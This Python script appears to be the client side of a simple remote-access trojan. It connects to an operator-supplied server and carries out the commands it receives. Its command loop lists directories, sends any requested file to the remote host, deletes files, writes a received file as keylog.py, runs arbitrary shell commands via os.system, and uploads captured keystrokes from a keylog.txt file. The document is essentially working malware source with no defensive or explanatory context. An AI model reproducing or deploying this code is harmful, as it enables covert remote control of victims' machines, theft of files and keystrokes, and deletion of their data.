import os
import socket
sock=socket.socket()
port=348
date="date"
print(os.system(date))
host=input(str("please enter the server address : "))
sock.connect((host,port))
print("************************************")
print("connnection successful")
print("************************************")
while 1:
    command=sock.recv(1024)
    command=command.decode()
    print("command successfully received")
    print("********************************")
    if command=="view cwd":
        files=os.getcwd()
        files=str(files)
        sock.send(files.encode())
        print("successfully completed the execution")
        print("************************************")
    elif command=="Custom":
        custom=sock.recv(1024)
        custom=custom.decode()
        #for files in os.listdir(custom):
        files=os.listdir(custom)
        files=str(files)
        sock.send(files.encode())
        print("files listed successfully")
        print("************************************")
    elif command=="Download":
        filepath=sock.recv(1024)
        filepath=filepath.decode()
        file=open(filepath,"rb")
        data=file.read()
        sock.send(data)
        print("file download successful")
    elif command=="Delete":
        path=sock.recv(1024)
        path=path.decode()
        os.remove(path)
        print("**********************************")
        print("Delete successful")
        print("**********************************")
    elif command=="Share":
        os.chdir("/root/Music")
        file = sock.recv(10000)
        new_file = open("keylog.py", "wb")
        new_file.write(file)
        new_file.close()
    elif command=="Open":
        app=sock.recv(1024)
        app=app.decode()
        os.system(app)
        print("************************************")
        print("Application started successfully")
        print("************************************")
    elif command=="keylogge r":
        keyfile=open("/root/Documents/keylog.txt","rb")
        data=keyfile.read()
        sock.send(data)
        print("keylogger successfully downloaded")
    elif command=="terminal":
        os.chdir("/root/Desktop")
        comm=sock.recv(1024)
        comm=comm.decode()
        os.system(comm)
    else:
        print("************************************")
        print("execution failed")
        print("************************************")
        break
